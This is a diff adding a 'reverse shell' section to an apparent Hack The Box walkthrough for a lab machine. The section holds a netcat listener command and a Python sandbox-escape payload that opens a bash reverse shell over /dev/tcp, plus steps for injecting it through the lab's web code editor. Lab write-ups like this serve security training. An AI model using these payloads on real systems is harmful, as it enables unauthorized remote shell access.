@@ -75,3 +75,65 @@ http://code.htb:5000
         Upload/execute payloads
 
         Sandbox escape (if limited)
+
+## 🏴‍☠️ Initial Foothold - Reverse Shell
+
+### 🎯 Objective:
+Gain initial access to the target system by exploiting the Python Code Editor and establishing a reverse shell.
+
+---
+
+### 🧰 Prerequisites:
+
+- ✅ **Python** must be installed on the **target** machine.
+- ✅ **Netcat (nc)** must be installed on the **attacker's** machine.
+- ✅ Ensure the **target machine can reach the attacker’s IP and port**.
+
+---
+
+### 🪝 Step-by-Step Guide: Gaining a Reverse Shell
+
+#### 📌 Step 1: Set Up a Listener on the Attacker’s Machine
+
+On your Kali/Parrot or attacker machine, open a terminal and start Netcat to listen for the incoming connection:
+
+```bash
+nc -lvnp 4444
+```
+
+Flags explanation:
+
+    -l: Listen for incoming connections
+
+    -v: Verbose output
+
+    -n: Don’t perform DNS resolution
+
+    -p 4444: Use port 4444 for the listener
+
+📌 Step 2: Craft the Reverse Shell Payload
+
+Use Python’s dynamic class reference to spawn a bash shell back to your machine:
+
+(().__class__.__base__.__subclasses__()[317])(["/bin/bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"])
+
+    🔁 Replace ATTACKER_IP with your actual IP address (e.g., 10.10.14.89 from HTB VPN).
+
+📌 Step 3: Execute the Payload on the Target Machine
+
+Choose any of the following methods based on your access level:
+🔹 Method 1: Direct Python Execution
+
+If you already have a shell or console on the target:
+
+python3 -c '(().__class__.__base__.__subclasses__()[317])(["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.14.89/4444 0>&1"])'
+
+🔹 Method 2: Remote Code Execution (RCE) via Python Code Editor
+
+Inject the payload through the web interface:
+
+    Visit: http://code.htb:5000
+
+    Enter the payload in the code execution area.
+
+    Trigger execution.
